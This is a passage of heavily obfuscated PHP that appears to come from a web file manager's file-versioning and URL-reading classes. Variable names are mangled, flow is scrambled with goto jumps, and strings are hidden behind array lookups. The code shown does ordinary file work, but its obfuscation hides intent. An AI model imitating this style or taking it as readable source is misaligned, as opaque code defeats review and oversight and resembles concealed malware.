FßŒ¤ŠÚé; eŞÓÑ×Ş: $bˆš‰²Š = self::checkInHistory($d¡Ï¼ÓØ‰Ô); if (!$bˆš‰²Š) { return; } $C“½Ç†Š÷ = self::pathHistory($b£˜†æÁè); goto A©íé¬ëæÚ; f´óÇó½¨µ: $b£˜†æÁè = self::parsePath($eÜì³¨Ò·â[1]); if (!$b£˜†æÁè) { return; } $DË¢¯ªì = $eÜì³¨Ò·â[3]; goto eŞÓÑ×Ş; A©íé¬ëæÚ: if ($bˆš‰²Š[$dä£ÕÜº§[39]] == $dä£ÕÜº§[203]) { $BË±­ø¤ç’ = self::listData($d¡Ï¼ÓØ‰Ô); $cŒëòÉšÃˆ = rtrim($b£˜†æÁè, $dä£ÕÜº§[18]) . $dä£ÕÜº§[18] . ($DË¢¯ªì ? $DË¢¯ªì : get_path_this($d¡Ï¼ÓØ‰Ô)); $aåÃĞ«Ÿ‘ = self::listData($cŒëòÉšÃˆ); if ($BË±­ø¤ç’ && $BË±­ø¤ç’[$dä£ÕÜº§[376]] && $aåÃĞ«Ÿ‘ && $aåÃĞ«Ÿ‘[$dä£ÕÜº§[376]]) { return self::clear($d¡Ï¼ÓØ‰Ô); } if ($BË±­ø¤ç’ && $BË±­ø¤ç’[$dä£ÕÜº§[376]]) { self::moveHistory($d¡Ï¼ÓØ‰Ô, $DË¢¯ªì, $C“½Ç†Š÷); } } else { IO::move($bˆš‰²Š[$dä£ÕÜº§[86]], $C“½Ç†Š÷, !1, $DË¢¯ªì); self::clearEmptyFolder(IO::pathFather($bˆš‰²Š[$dä£ÕÜº§[86]])); } goto E‰¤ å•Ë³; FßŒ¤ŠÚé: $dä£ÕÜº§ =& $_SERVER[£¶ä½¶¢]; $d¡Ï¼ÓØ‰Ô = self::parsePath($eÜì³¨Ò·â[0]); if (!$d¡Ï¼ÓØ‰Ô) { return; } goto f´óÇó½¨µ; E‰¤ å•Ë³: } public static function eventAfterRemove($F‹½”ˆÛ³†, $Bæó¾ÈÍî) { goto fëË×µÊ«; fÒëæË±œ: if (!$cåğ¨†ÍŒÕ) { return; } $AÕ¨¹ÓÁë† = self::checkInHistory($cåğ¨†ÍŒÕ); if (!$AÕ¨¹ÓÁë†) { return; } goto A‹¤ëãééÁ; fëË×µÊ«: $cÓñ¹Ë³‹ =& $_SERVER[£¶ä½¶¢]; if (!$Bæó¾ÈÍî) { return; } $cåğ¨†ÍŒÕ = self::parsePath($F‹½”ˆÛ³†[0]); goto fÒëæË±œ; A‹¤ëãééÁ: if ($AÕ¨¹ÓÁë†[$cÓñ¹Ë³‹[39]] == $cÓñ¹Ë³‹[203]) { $aÌ¡®³À® = self::listData($cåğ¨†ÍŒÕ, !1); if ($aÌ¡®³À® && $aÌ¡®³À®[$cÓñ¹Ë³‹[376]]) { self::clear($cåğ¨†ÍŒÕ, !1); } } else { IO::remove($AÕ¨¹ÓÁë†[$cÓñ¹Ë³‹[86]]); self::clearEmptyFolder(IO::pathFather($AÕ¨¹ÓÁë†[$cÓñ¹Ë³‹[86]])); } goto B¡ªª±Ï•ª; B¡ªª±Ï•ª: } private static function checkInHistory($eïê®¸½Ü) { $a¤§È¢‰íÒ = self::pathHistory($eïê®¸½Ü); if (!IO::exist($a¤§È¢‰íÒ)) { $a¤§È¢‰íÒ .= $_SERVER[£¶ä½¶¢][1116]; } return IO::exist($a¤§È¢‰íÒ) ? IO::info($a¤§È¢‰íÒ) : !1; } private static function parsePath($E’ÅŒµ È) { goto CÎ‹Ñğ†ê; B±£†Ö: if (!$FœÇØçß’† || !$a˜òãŞÎ®©[$aÖ¼Øƒ¸¬©[1118]]) { return !1; } if ($a‡æ›øø× == KodIO::KOD_SHARE_ITEM) { $cŸ¿ïòá¡ = IO::init($E’ÅŒµ È); if ($cŸ¿ïòá¡->pathParse[$aÖ¼Øƒ¸¬©[1046]]) { return self::parsePath($cŸ¿ïòá¡->pathParse[$aÖ¼Øƒ¸¬©[1046]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto eÖ…èçï„è; E¬ããó…òŠ: return $E’ÅŒµ È; goto A©ÚŒ‰‡; eÖ…èçï„è: $Bá³‚ãê¨Ñ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $aÖ¼Øƒ¸¬©[1119]); foreach ($Bá³‚ãê¨Ñ as $D·×èİ²Úø) { if (!$a‡æ›øø× && substr($E’ÅŒµ È, 0, strlen($D·×èİ²Úø)) == $D·×èİ²Úø) { return !1; } } self::log($GLOBALS[$aÖ¼Øƒ¸¬©[1041]] . $aÖ¼Øƒ¸¬©[1120] . $E’ÅŒµ È); goto E¬ããó…òŠ; f“‹Á… Ÿ: $a˜òãŞÎ®© = KodIO::parse($E’ÅŒµ È); $a‡æ›øø× = $a˜òãŞÎ®©[$aÖ¼Øƒ¸¬©[39]]; $FœÇØçß’† = !$a‡æ›øø× || $a‡æ›øø× == KodIO::KOD_IO || $a‡æ›øø× == KodIO::KOD_SHARE_ITEM; goto B±£†Ö; CÎ‹Ñğ†ê: $aÖ¼Øƒ¸¬© =& $_SERVER[£¶ä½¶¢]; if (!$E’ÅŒµ È) { return !1; } if ($GLOBALS[$aÖ¼Øƒ¸¬©[1117]]) { return; } goto f“‹Á… Ÿ; A©ÚŒ‰‡: } private static function pathHistory($a¨Ù„àë†ã) { $fÜ¹ó³Ø…¿ =& $_SERVER[£¶ä½¶¢]; $dšÍšùšÀ˜ = self::$_historyBase . ltrim(KodIO::clear($a¨Ù„àë†ã), $fÜ¹ó³Ø…¿[18]); $dšÍšùšÀ˜ = str_replace(array($fÜ¹ó³Ø…¿[1121]), array($fÜ¹ó³Ø…¿[1122]), $dšÍšùšÀ˜); return $dšÍšùšÀ˜; } public static function log($b˜Á‚ÍğĞ‰) { } public static function historyCount($A‰ŒŸˆÄöÚ) { $Aõ»ØËŠ‘­ =& $_SERVER[£¶ä½¶¢]; $a‚õ•É²Ø = array(); $EÆâ£°ĞŞ = array(); foreach ($A‰ŒŸˆÄöÚ as $f¦ªóÌ“‚„) { $eî‹Í˜³õ« = get_path_father($f¦ªóÌ“‚„); if (!$EÆâ£°ĞŞ[$eî‹Í˜³õ«]) { $EÆâ£°ĞŞ[$eî‹Í˜³õ«] = array(); } $EÆâ£°ĞŞ[$eî‹Í˜³õ«][] = get_path_this($f¦ªóÌ“‚„); } foreach ($EÆâ£°ĞŞ as $eî‹Í˜³õ« => $d¹ØÜØâÕ) { $có‡ŸéğİĞ = self::parsePath($eî‹Í˜³õ«); if (!$có‡ŸéğİĞ) { continue; } foreach ($d¹ØÜØâÕ as $bÁõÊ«œè‘) { $e«âÕ­Ñ¹§ = self::listData(rtrim($có‡ŸéğİĞ, $Aõ»ØËŠ‘­[18]) . $Aõ»ØËŠ‘­[18] . $bÁõÊ«œè‘, !1); if ($e«âÕ­Ñ¹§ && $e«âÕ­Ñ¹§[$Aõ»ØËŠ‘­[376]]) { $a‚õ•É²Ø[rtrim($eî‹Í˜³õ«, $Aõ»ØËŠ‘­[18]) . $Aõ»ØËŠ‘­[18] . $bÁõÊ«œè‘] = count($e«âÕ­Ñ¹§[$Aõ»ØËŠ‘­[376]]); } } } return $a‚õ•É²Ø; } public static function add($eÑÛ¥˜Ç‹–) { goto fËîÓ¸Ê; f¯ÚœÌâöà: if ($B ¡ƒ‘°á && $B ¡ƒ‘°á[0][$d…ÃÉ¶„‹[181]] == $eÈ¡‹…Ì×) { return !0; } if (array_key_exists($d…ÃÉ¶„‹[206], $CîÙÚİ½É») && !$CîÙÚİ½É»[$d…ÃÉ¶„‹[206]]) { return !1; } $bø»çï¥‰¶ = short_id(time()); goto EÌì„œ®Œì; føÍ³Ã‚”: if (!$BÇÜ²ê¼ ±) { self::clearEmptyFolder($DÌòâç™à[$d…ÃÉ¶„‹[1127]]); return !1; } array_unshift($B ¡ƒ‘°á, $CÌ—ˆÌ‰­); if (count($B ¡ƒ‘°á) > $d¦ïŠÔŸ‘“) { $dœ‡ÑëêÌØ = array_slice($B ¡ƒ‘°á, $d¦ïŠÔŸ‘“); foreach ($dœ‡ÑëêÌØ as $AéÇ©ë¦“‘) { IO::remove($DÌòâç™à[$d…ÃÉ¶„‹[1127]] . $AéÇ©ë¦“‘[$d…ÃÉ¶„‹[38]]); } $B ¡ƒ‘°á = array_slice($B ¡ƒ‘°á, 0, $d¦ïŠÔŸ‘“); } goto Bšô‹¹ƒ±Ô; EÌì„œ®Œì: $CÌ—ˆÌ‰­ = array($d…ÃÉ¶„‹[401] => $bø»çï¥‰¶, $d…ÃÉ¶„‹[181] => $eÈ¡‹…Ì×, $d…ÃÉ¶„‹[38] => $CîÙÚİ½É»[$d…ÃÉ¶„‹[38]] . $d…ÃÉ¶„‹[105] . date($d…ÃÉ¶„‹[1125]) . rand_string(1), $d…ÃÉ¶„‹[88] => $CîÙÚİ½É»[$d…ÃÉ¶„‹[88]], $d…ÃÉ¶„‹[440] => USER_ID, $d…ÃÉ¶„‹[204] => time(), $d…ÃÉ¶„‹[1126] => $d…ÃÉ¶„‹[43]); IO::mkdir($DÌòâç™à[$d…ÃÉ¶„‹[1127]]); $BÇÜ²ê¼ ± = IO::copy($eÑÛ¥˜Ç‹–, $DÌòâç™à[$d…ÃÉ¶„‹[1127]], !1, $CÌ—ˆÌ‰­[$d…ÃÉ¶„‹[38]]); goto føÍ³Ã‚”; fÁÃ×ÔßâÀ: $Cª¤ÖÓİ‘­ = Model($d…ÃÉ¶„‹[738])->get($d…ÃÉ¶„‹[1123]); $Bñº ²åÙ° = $GLOBALS[$d…ÃÉ¶„‹[16]][$d…ÃÉ¶„‹[98]][$d…ÃÉ¶„‹[1102]]; $d¦ïŠÔŸ‘“ = $Cª¤ÖÓİ‘­ == $d…ÃÉ¶„‹[1124] ? 5 : $Bñº ²åÙ°; goto dÔµÌº‰Èš; fËîÓ¸Ê: $d…ÃÉ¶„‹ =& $_SERVER[£¶ä½¶¢]; $DÌòâç™à = self::listData($eÑÛ¥˜Ç‹–); if (!$DÌòâç™à) { return; } goto fÁÃ×ÔßâÀ; fÁâˆ«ÃÀ: $B ¡ƒ‘°á = $DÌòâç™à[$d…ÃÉ¶„‹[376]]; if ($CîÙÚİ½É»[$d…ÃÉ¶„‹[88]] == 0) { return; } if ($CîÙÚİ½É»[$d…ÃÉ¶„‹[88]] >= 1024 * 1024 * 500) { return !1; } goto f¯ÚœÌâöà; Bšô‹¹ƒ±Ô: return self::saveData($DÌòâç™à[$d…ÃÉ¶„‹[1128]], $B ¡ƒ‘°á); goto DÀ¨ì—ÎÅ; dÔµÌº‰Èš: if ($Bñº ²åÙ° <= 0) { return; } $eÈ¡‹…Ì× = IO::hashSimple($eÑÛ¥˜Ç‹–); $CîÙÚİ½É» = IO::info($eÑÛ¥˜Ç‹–); goto fÁâˆ«ÃÀ; DÀ¨ì—ÎÅ: } public static function remove($c¿’Á¢¯©Î, $B­è”¶œäà) { $eæÍ„‚Í› =& $_SERVER[£¶ä½¶¢]; $AÙ’²Ø²Ö = self::listData($c¿’Á¢¯©Î); $FÈ÷Ü¦š›˜ = array(); if (!$AÙ’²Ø²Ö) { return !1; } foreach ($AÙ’²Ø²Ö[$eæÍ„‚Í›[376]] as $aˆè¬Ì¨ó) { if ($aˆè¬Ì¨ó[$eæÍ„‚Í›[401]] == $B­è”¶œäà) { IO::remove($AÙ’²Ø²Ö[$eæÍ„‚Í›[1127]] . $aˆè¬Ì¨ó[$eæÍ„‚Í›[38]]); continue; } $FÈ÷Ü¦š›˜[] = $aˆè¬Ì¨ó; } return self::saveData($AÙ’²Ø²Ö[$eæÍ„‚Í›[1128]], $FÈ÷Ü¦š›˜); } public static function clear($aº¢ƒÈØé«, $FÎÌ½•­¡¶ = true) { $C±Îò¥Çæ’ =& $_SERVER[£¶ä½¶¢]; $C°‰á¯õ£¬ = self::listData($aº¢ƒÈØé«, $FÎÌ½•­¡¶); if (!$C°‰á¯õ£¬) { return !1; } foreach ($C°‰á¯õ£¬[$C±Îò¥Çæ’[376]] as $CÄ†ˆÒÈ«½) { IO::remove($C°‰á¯õ£¬[$C±Îò¥Çæ’[1127]] . $CÄ†ˆÒÈ«½[$C±Îò¥Çæ’[38]]); } return self::saveData($C°‰á¯õ£¬[$C±Îò¥Çæ’[1128]], array()); } public static function moveHistory($c©ïóÂŒÎã, $b‚§å¼¢‰“ = '', $D‡ì‹©ó£‰ = '') { goto b¸¶©¦É…ò; b¸¶©¦É…ò: $C’–‡äÚ¬ =& $_SERVER[£¶ä½¶¢]; $bÌÅø¢ï = self::listData($c©ïóÂŒÎã, !1); if (!$bÌÅø¢ï || !$bÌÅø¢ï[$C’–‡äÚ¬[376]]) { return !1; } goto càÍõéš¦©; bŒÄ·¬‚°Û: $Aò»Ñ½Ù§ = substr(get_path_this($bÌÅø¢ï[$C’–‡äÚ¬[1128]]), 0, -strlen($bà¼óó‰¡)); foreach ($bÌÅø¢ï[$C’–‡äÚ¬[376]] as $CĞà‰Š¡ŸÀ => $D®ÃÜ¨Ôõ) { $eºøù¾á±¡ = $b‚§å¼¢‰“ . substr($D®ÃÜ¨Ôõ[$C’–‡äÚ¬[38]], strlen($Aò»Ñ½Ù§)); $Dˆ×…×ç× = IO::move($bÌÅø¢ï[$C’–‡äÚ¬[1127]] . $D®ÃÜ¨Ôõ[$C’–‡äÚ¬[38]], $D‡ì‹©ó£‰, !1, $eºøù¾á±¡); if ($Dˆ×…×ç×) { $bÌÅø¢ï[$C’–‡äÚ¬[376]][$CĞà‰Š¡ŸÀ][$C’–‡äÚ¬[38]] = $eºøù¾á±¡; } } $bÌÅø¢ï[$C’–‡äÚ¬[1128]] = IO::move($bÌÅø¢ï[$C’–‡äÚ¬[1128]], $D‡ì‹©ó£‰, !1, $b‚§å¼¢‰“ . $bà¼óó‰¡); goto E³³İÈ¢Áç; E³³İÈ¢Áç: self::saveData($bÌÅø¢ï[$C’–‡äÚ¬[1128]], $bÌÅø¢ï[$C’–‡äÚ¬[376]]); self::clearEmptyFolder($bÌÅø¢ï[$C’–‡äÚ¬[1127]]); goto aŞ„‚ºóŸË; càÍõéš¦©: $bà¼óó‰¡ = $C’–‡äÚ¬[1116]; $b‚§å¼¢‰“ = $b‚§å¼¢‰“ ? $b‚§å¼¢‰“ : get_path_this($c©ïóÂŒÎã); $D‡ì‹©ó£‰ = $D‡ì‹©ó£‰ ? $D‡ì‹©ó£‰ : $bÌÅø¢ï[$C’–‡äÚ¬[1127]]; goto bŒÄ·¬‚°Û; aŞ„‚ºóŸË: } public static function rollback($ašİËğ» Ö, $CÑ„„§ø‚Œ) { $fº¡¬¬¦®‘ =& $_SERVER[£¶ä½¶¢]; $fÒ·Ûø’îñ = self::listData($ašİËğ» Ö); if (!$fÒ·Ûø’îñ) { return; } $F‰ßœ¦Ë¶Ã = IO::info($ašİËğ» Ö); foreach ($fÒ·Ûø’îñ[$fº¡¬¬¦®‘[376]] as $BµÃÑÚ¥Üê => $EÑë¡Ç«£¢) { if ($EÑë¡Ç«£¢[$fº¡¬¬¦®‘[401]] == $CÑ„„§ø‚Œ) { self::add($ašİËğ» Ö); $EÍÚ¼ë‡ğÑ = $fÒ·Ûø’îñ[$fº¡¬¬¦®‘[1127]] . $EÑë¡Ç«£¢[$fº¡¬¬¦®‘[38]]; $aŠ¨¡Ö¶Æà = IO::copy($EÍÚ¼ë‡ğÑ, IO::pathFather($ašİËğ» Ö), REPEAT_REPLACE, $F‰ßœ¦Ë¶Ã[$fº¡¬¬¦®‘[38]]); if ($aŠ¨¡Ö¶Æà) { self::remove($ašİËğ» Ö, $CÑ„„§ø‚Œ); } return $aŠ¨¡Ö¶Æà; } } return !1; } public static function setDetail($e—ì…å¾½, $d­×õªœÌ, $fÚÜèË¤ä) { $b©Û©ê¿¹ê =& $_SERVER[£¶ä½¶¢]; $D”ôëˆÜÜ = self::listData($e—ì…å¾½); if (!$D”ôëˆÜÜ) { return; } foreach ($D”ôëˆÜÜ[$b©Û©ê¿¹ê[376]] as $F‘óÓºˆŒÍ => $a¬Ñ¬ñ‘Ê±) { if ($a¬Ñ¬ñ‘Ê±[$b©Û©ê¿¹ê[401]] == $d­×õªœÌ) { $D”ôëˆÜÜ[$b©Û©ê¿¹ê[376]][$F‘óÓºˆŒÍ][$b©Û©ê¿¹ê[1126]] = $fÚÜèË¤ä; self::saveData($D”ôëˆÜÜ[$b©Û©ê¿¹ê[1128]], $D”ôëˆÜÜ[$b©Û©ê¿¹ê[376]]); return !0; } } return !1; } public static function fileInfo($aá†ä¯ªÜ, $Dåäƒ‘¸®ï) { goto cî¨é¢¥; c³¤ìÒÖ: $dğÒœéËñ‰ = $d×åâÍçé[43]; foreach ($bÈğœÍáŸ‘[$d×åâÍçé[376]] as $bÒ¢Òîïè => $F“œèêì¼) { if ($F“œèêì¼[$d×åâÍçé[401]] != $Dåäƒ‘¸®ï) { continue; } $dğÒœéËñ‰ = $bÈğœÍáŸ‘[$d×åâÍçé[1127]] . $F“œèêì¼[$d×åâÍçé[38]]; break; } if (!$dğÒœéËñ‰) { show_json(LNG($d×åâÍçé[115]), !1); } goto Eâ“å‹‘ª†; cî¨é¢¥: $d×åâÍçé =& $_SERVER[£¶ä½¶¢]; $bÈğœÍáŸ‘ = self::listData($aá†ä¯ªÜ); if (!$bÈğœÍáŸ‘) { show_json(LNG($d×åâÍçé[115]), !1); } goto c³¤ìÒÖ; Eâ“å‹‘ª†: return IO::info($dğÒœéËñ‰); goto d†šÄÖëÍ‚; d†šÄÖëÍ‚: } public static function fileOut($bÅè¾œò¢½, $DœÎõë¶¢£, $AíÛ‘‰Ò¯‘ = false) { $B¶¬Ó­ÜÇÆ =& $_SERVER[£¶ä½¶¢]; $Dï­ö×…Œ¥ = self::fileInfo($bÅè¾œò¢½, $DœÎõë¶¢£); $C ¤­˜¶Ã =& $GLOBALS[$B¶¬Ó­ÜÇÆ[17]]; $AíÛ‘‰Ò¯‘ = isset($C ¤­˜¶Ã[$B¶¬Ó­ÜÇÆ[1092]]) && $C ¤­˜¶Ã[$B¶¬Ó­ÜÇÆ[1092]] == 1; if (isset($C ¤­˜¶Ã[$B¶¬Ó­ÜÇÆ[39]]) && $C ¤­˜¶Ã[$B¶¬Ó­ÜÇÆ[39]] == $B¶¬Ó­ÜÇÆ[1129]) { return IO::fileOutImage($Dï­ö×…Œ¥[$B¶¬Ó­ÜÇÆ[86]], $C ¤­˜¶Ã[$B¶¬Ó­ÜÇÆ[1130]]); } IO::fileOut($Dï­ö×…Œ¥[$B¶¬Ó­ÜÇÆ[86]], $AíÛ‘‰Ò¯‘, get_path_this($bÅè¾œò¢½)); } public static function listData($aÒ¹®ÂÒçØ, $AÖ¬Á¢²‚İ = true) { goto BæÇƒ¯„…Æ; F·ÌŒ÷œ›—: $eÒ£×Í‹‚ = IO::getContent($d“ÓÎ®÷Ö[$aùÙé£È§ [1128]]); if ($eÒ£×Í‹‚) { $dÀ÷Ç‹éñ = json_decode($eÒ£×Í‹‚, !0); if (is_array($dÀ÷Ç‹éñ)) { $d“ÓÎ®÷Ö[$aùÙé£È§ [376]] = $dÀ÷Ç‹éñ; } } return $d“ÓÎ®÷Ö; goto aù”¥Éóî; BæÇƒ¯„…Æ: $aùÙé£È§  =& $_SERVER[£¶ä½¶¢]; if ($AÖ¬Á¢²‚İ && !IO::exist($aÒ¹®ÂÒçØ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Fš¸İ¨ÅÛä; Fš¸İ¨ÅÛä: if (substr($aÒ¹®ÂÒçØ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $F·‰èÀ±â = self::pathHistory($aÒ¹®ÂÒçØ); $d“ÓÎ®÷Ö = array($aùÙé£È§ [1128] => $F·‰èÀ±â . $aùÙé£È§ [1116], $aùÙé£È§ [1127] => rtrim(get_path_father($F·‰èÀ±â), $aùÙé£È§ [18]) . $aùÙé£È§ [18], $aùÙé£È§ [376] => array()); goto F·ÌŒ÷œ›—; aù”¥Éóî: } private static function saveData($FªÊÓ¹–ÌŠ, $bÉÎ®Ö©Ö) { goto a¢•Å”›»; a‘“ß‰³â: $c’À‘÷õê§ = IO::pathFather($FªÊÓ¹–ÌŠ); IO::remove($FªÊÓ¹–ÌŠ); self::clearEmptyFolder($c’À‘÷õê§); goto c·¦± „»’; a¢•Å”›»: $D©˜·‘âÏİ =& $_SERVER[£¶ä½¶¢]; self::log($D©˜·‘âÏİ[1131] . $FªÊÓ¹–ÌŠ . $D©˜·‘âÏİ[78] . count($bÉÎ®Ö©Ö), $D©˜·‘âÏİ[720]); if ($bÉÎ®Ö©Ö) { return IO::setContent($FªÊÓ¹–ÌŠ, json_encode($bÉÎ®Ö©Ö)); } goto a‘“ß‰³â; c·¦± „»’: return !0; goto DÕˆÍà‚Å; DÕˆÍà‚Å: } public static function clearEmptyFolder($d·«çÎ—Ÿµ) { goto CÚ§†·¿„; CÚ§†·¿„: $eó¦Ã³‹œé =& $_SERVER[£¶ä½¶¢]; if (trim($d·«çÎ—Ÿµ, $eó¦Ã³‹œé[18]) == trim(self::$_historyBase, $eó¦Ã³‹œé[18])) { return; } $c‚ÁÖÆ²³‘ = IO::pathFather($d·«çÎ—Ÿµ); goto f¨†ÆÆ±İ; DõŒ ›®æÆ: self::clearEmptyFolder($c‚ÁÖÆ²³‘); goto cø„ãŒöÕ; f¨†ÆÆ±İ: $a…¢Æ—¬ê£ = IO::has($d·«çÎ—Ÿµ, !0); if ($a…¢Æ—¬ê£[$eó¦Ã³‹œé[213]] > 0 || $a…¢Æ—¬ê£[$eó¦Ã³‹œé[214]] > 0) { return; } IO::remove($d·«çÎ—Ÿµ); goto DõŒ ›®æÆ; cø„ãŒöÕ: } private static function getBasePath() { goto e–ÏÇãŒ§; e–ÏÇãŒ§: $BêÖ—ª†¦ =& $_SERVER[£¶ä½¶¢]; $b’ËÑé‚ÇÑ = Model($BêÖ—ª†¦[1132])->get($BêÖ—ª†¦[1133]); if (IO::exist($b’ËÑé‚ÇÑ)) { return $b’ËÑé‚ÇÑ; } goto C¯Ş§¹áÚñ; C¯Ş§¹áÚñ: $b’ËÑé‚ÇÑ = DATA_PATH . $BêÖ—ª†¦[1134]; $b’ËÑé‚ÇÑ = IO::mkdir($b’ËÑé‚ÇÑ); $b’ËÑé‚ÇÑ = rtrim($b’ËÑé‚ÇÑ, $BêÖ—ª†¦[18]) . $BêÖ—ª†¦[18]; goto B„ªäí•ÆÜ; B„ªäí•ÆÜ: file_put_contents($b’ËÑé‚ÇÑ . $BêÖ—ª†¦[1135], $BêÖ—ª†¦[43]); Model($BêÖ—ª†¦[1132])->set($BêÖ—ª†¦[1133], $b’ËÑé‚ÇÑ); return $b’ËÑé‚ÇÑ; goto dÌÍ„”º’†; dÌÍ„”º’†: } } goto C¡œÌñµ’; bÅä‡Õ«œ¾: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($A¬î¶ÃŒ¦® = false) { } public function exist($Aä¸¯íñ×) { $e„ƒ»´¬ªê = $this->info($Aä¸¯íñ×); return $e„ƒ»´¬ªê[$_SERVER[£¶ä½¶¢][205]]; } public function isFile($cÇÉôÜÁöŸ) { $AÃïî„±ê = $this->info($cÇÉôÜÁöŸ); return $AÃïî„±ê[$_SERVER[£¶ä½¶¢][205]]; } public function isFolder($C¹àÀâµ²Ê) { return !1; } public function size($d§Óˆâíù) { $CÈâˆ±¡‚ö = $this->info($d§Óˆâíù); return $CÈâˆ±¡‚ö[$_SERVER[£¶ä½¶¢][88]]; } public function info($Eô£ïÖë¤) { return $this->infoParse($Eô£ïÖë¤); } public function infoAuth($b¢²Æ¿àÍ) { return $this->infoParse($b¢²Æ¿àÍ); } public function infoWithChildren($AÏŠÊ§àŠõ) { return $this->infoParse($AÏŠÊ§àŠõ); } public function infoFull($CÕ„Öõ®Š–) { return $this->infoParse($CÕ„Öõ®Š–); } private function infoParse($bÓ–¤«¿Ãœ) { $FìÜƒ«‚îÛ =& $_SERVER[£¶ä½¶¢]; $fá×ÍÓ’¡ã = $this->header($bÓ–¤«¿Ãœ); if (!$fá×ÍÓ’¡ã || !$fá×ÍÓ’¡ã[$FìÜƒ«‚îÛ[718]]) { return !1; } $F¡„ò„¾ô = _get($fá×ÍÓ’¡ã, $FìÜƒ«‚îÛ[344], 0); $BÛÃ‹ÂØ›ñ = array($FìÜƒ«‚îÛ[38] => $fá×ÍÓ’¡ã[$FìÜƒ«‚îÛ[38]], $FìÜƒ«‚îÛ[86] => $bÓ–¤«¿Ãœ, $FìÜƒ«‚îÛ[39] => $FìÜƒ«‚îÛ[203], $FìÜƒ«‚îÛ[88] => intval($F¡„ò„¾ô), $FìÜƒ«‚îÛ[178] => get_path_ext($fá×ÍÓ’¡ã[$FìÜƒ«‚îÛ[38]]), $FìÜƒ«‚îÛ[1253] => $F¡„ò„¾ô > 0 && $fá×ÍÓ’¡ã[$FìÜƒ«‚îÛ[1374]], $FìÜƒ«‚îÛ[1254] => !1); return $BÛÃ‹ÂØ›ñ; } private function header($c±‡ÍŠ•ôÉ) { goto dÖÈÃ‹‰ìÔ; Bàí»½Óôø: return self::$_cacheHeader[$c±‡ÍŠ•ôÉ]; goto AÅøƒ³ª…; Bƒ¸§è›¢î: $GLOBALS[$aÏêŸÛğ²„[1375]] = !0; self::$_cacheHeader[$c±‡ÍŠ•ôÉ] = url_header($c±‡ÍŠ•ôÉ); $GLOBALS[$aÏêŸÛğ²„[1375]] = $EÜ—¨ƒº¾; goto Bàí»½Óôø; dÖÈÃ‹‰ìÔ: $aÏêŸÛğ²„ =& $_SERVER[£¶ä½¶¢]; if (isset(self::$_cacheHeader[$c±‡ÍŠ•ôÉ])) { return self::$_cacheHeader[$c±‡ÍŠ•ôÉ]; } $EÜ—¨ƒº¾ = isset($GLOBALS[$aÏêŸÛğ²„[1375]]) ? $GLOBALS[$aÏêŸÛğ²„[1375]] : !1; goto Bƒ¸§è›¢î; AÅøƒ³ª…: } public function hashSimple($EÃœ¶´ºµã, $Dˆ÷ŒÏ›ÛÄ = false) { goto b¶ïœäí²; b¶ïœäí²: $D‡­‰‚•İÀ =& $_SERVER[£¶ä½¶¢]; $fâÅç„·ªº = $this->info($EÃœ¶´ºµã); if (!$fâÅç„·ªº || !$fâÅç„·ªº[$D‡­‰‚•İÀ[205]]) { return !1; } goto aŠÚòÂî¢Æ; cïŞÙ¼¾­: $EĞƒŒÇéì = timeFloat(); $D»öÈ²Ó¿ƒ = 15; for ($DöœğÚ÷® = 0; $DöœğÚ÷® < $DËƒŒÉ²çµ; $DöœğÚ÷®++) { if (timeFloat() - $EĞƒŒÇéì > $D»öÈ²Ó¿ƒ) { return !1; } $eñŞØ®Ä = $this->fileSubstr($EÃœ¶´ºµã, $C‡‰Ë¿£ * $DöœğÚ÷®, $eˆçÒÖİø¶); if (!$eñŞØ®Ä) { return !1; } $AÔ”‘ñÆˆõ .= $eñŞØ®Ä; } goto F˜¬Ö›Òù; aŠÚòÂî¢Æ: $D¿åßİ¹ = $fâÅç„·ªº[$D‡­‰‚•İÀ[88]]; $eˆçÒÖİø¶ = 200; $DËƒŒÉ²çµ = 50; goto C•ƒ™àéêĞ; F˜¬Ö›Òù: $AÔ”‘ñÆˆõ .= $this->fileSubstr($EÃœ¶´ºµã, $D¿åßİ¹ - $eˆçÒÖİø¶, $eˆçÒÖİø¶); return md5($AÔ”‘ñÆˆõ) . $D¿åßİ¹; goto ağó²‚ƒô; C•ƒ™àéêĞ: if ($D¿åßİ¹ <= $eˆçÒÖİø¶ * $DËƒŒÉ²çµ) { return md5($this->fileSubstr($EÃœ¶´ºµã, 0, $D¿åßİ¹)) . $D¿åßİ¹; } $C‡‰Ë¿£ = intval($D¿åßİ¹ / $DËƒŒÉ²çµ); $AÔ”‘ñÆˆõ = $D‡­‰‚•İÀ[43]; goto cïŞÙ¼¾­; ağó²‚ƒô: } public function getContent($a‡ô®ÜæÚÔ) { return $this->fileSubstr($a‡ô®ÜæÚÔ); } public function fileSubstr($E¥‚Æ™Õ„ù, $Añ„¯óŒ = 0, $Bê©å‡ãÆ = -1) { goto bòñË‹ö¹§; D±¢­ÙÑíÓ: if ($Bê©å‡ãÆ === -1) { $Bê©å‡ãÆ = $DŠ×ÅÉ·[$e…®‘—°£[88]]; } if ($Bê©å‡ãÆ == 0) { return $e…®‘—°£[43]; } $eÎí‡Èù¾ = array($e…®‘—°£[1376] . $Añ„¯óŒ . $e…®‘—°£[752] . ($Añ„¯óŒ + $Bê©å‡ãÆ - 1)); goto FÓå•¥ ’; FÓå•¥ ’: $e‰°¿…ğ­­ = url_request($E¥‚Æ™Õ„ù, $e…®‘—°£[238], !1, $eÎí‡Èù¾, !1, !1, 1); return $e‰°¿…ğ­­[$e…®‘—°£[1086]] ? $e‰°¿…ğ­­[$e…®‘—°£[1086]] : $e…®‘—°£[43]; goto dº¥Ñ³”Ï; bòñË‹ö¹§: $e…®‘—°£ =& $_SERVER[£¶ä½¶¢]; $DŠ×ÅÉ· = $this->info($E¥‚Æ™Õ„ù); if (!$DŠ×ÅÉ· || !$DŠ×ÅÉ·[$e…®‘—°£[205]] && $DŠ×ÅÉ·[$e…®‘—°£[88]] > 1024 * 1024 * 10) { return !1; } goto D±¢­ÙÑíÓ; dº¥Ñ³”Ï: } public function download($BîâòºŸÚ, $c®Ö·‹‰„Â) { Downloader::start($BîâòºŸÚ, $c®Ö·‹‰„Â); return $c®Ö·‹‰„Â; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($c’…ôó‘½, $e‚‡‹­¨º = '') { goto EâòªŠÄç›; eÆÀğÉÙ¹İ: 